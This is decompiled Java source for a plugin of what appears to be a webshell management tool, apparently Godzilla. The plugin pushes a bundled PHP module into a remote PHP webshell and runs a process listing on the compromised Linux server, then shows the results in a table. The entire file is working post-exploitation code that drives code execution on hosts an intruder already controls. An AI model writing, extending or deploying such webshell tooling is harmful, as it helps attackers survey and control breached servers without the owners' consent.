/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.plugins.php;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.DataView;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.io.InputStream;
import java.util.Vector;
import java.util.concurrent.CopyOnWriteArrayList;
import javax.swing.JButton;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(payloadName="PhpDynamicPayload", Name="PPs", DisplayName="\u8fdb\u7a0b\u8be6\u60c5")
public class PPs
implements Plugin {
    private static final String CLASS_NAME = "Ps";
    private static final Vector COLUMNS_VECTOR = new Vector<String>(new CopyOnWriteArrayList<String>(new String[]{"UID", "PID", "PPID", "STIME", "TTY", "TIME", "CMD"}));
    private final JPanel panel = new JPanel(new BorderLayout());
    private final DataView dataView;
    private final JButton scanButton = new JButton("ps");
    private boolean loadState;
    private final JSplitPane portScanSplitPane;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;

    public PPs() {
        this.dataView = new DataView(null, COLUMNS_VECTOR, -1, -1);
        this.portScanSplitPane = new JSplitPane();
        this.portScanSplitPane.setOrientation(0);
        this.portScanSplitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.scanButton);
        this.portScanSplitPane.setTopComponent(topPanel);
        this.portScanSplitPane.setBottomComponent(new JScrollPane(this.dataView));
        this.panel.add(this.portScanSplitPane);
    }

    private void load() {
        if (!this.loadState) {
            try {
                InputStream inputStream = this.getClass().getResourceAsStream(String.format("assets/%s.php", CLASS_NAME));
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                this.loadState = this.payload.include(CLASS_NAME, data);
                if (this.loadState) {
                    this.loadState = true;
                    Log.log("Load success", new Object[0]);
                } else {
                    Log.log("Load fail", new Object[0]);
                }
            } catch (Exception e) {
                Log.error(e);
            }
        }
    }

    private void scanButtonClick(ActionEvent actionEvent) {
        if (!this.payload.isWindows()) {
            this.load();
            byte[] result = this.payload.evalFunc(CLASS_NAME, "run", new ReqParameter());
            String resultString = this.encoding.Decoding(result);
            this.formatResult(resultString);
        } else {
            GOptionPane.showMessageDialog(this.shellEntity.getFrame(), "\u4ec5\u652f\u6301Linux", "\u8b66\u544a", 2);
        }
    }

    private void formatResult(String resultString) {
        String[] lines = resultString.split("\n");
        String[] infos = null;
        Vector rowsVector = new Vector();
        Vector<String> columnVector = null;
        Log.log(resultString, new Object[0]);
        for (String line : lines) {
            try {
                infos = line.trim().split("\t");
                Vector<String> oneRowVector = new Vector<String>();
                for (String info : infos) {
                    oneRowVector.add(info.trim());
                }
                if (columnVector == null) {
                    columnVector = oneRowVector;
                    continue;
                }
                int index = oneRowVector.size() - 1;
                String v = (String)oneRowVector.get(index);
                oneRowVector.set(index, new String(functions.base64Decode(v)));
                rowsVector.add(oneRowVector);
            } catch (Exception e) {
                Log.error(line);
            }
        }
        this.dataView.getModel().setColumnIdentifiers(columnVector);
        this.dataView.AddRows(rowsVector);
    }

    @Override
    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    @Override
    public JPanel getView() {
        if (!this.payload.isWindows()) {
            return this.panel;
        }
        return null;
    }
}

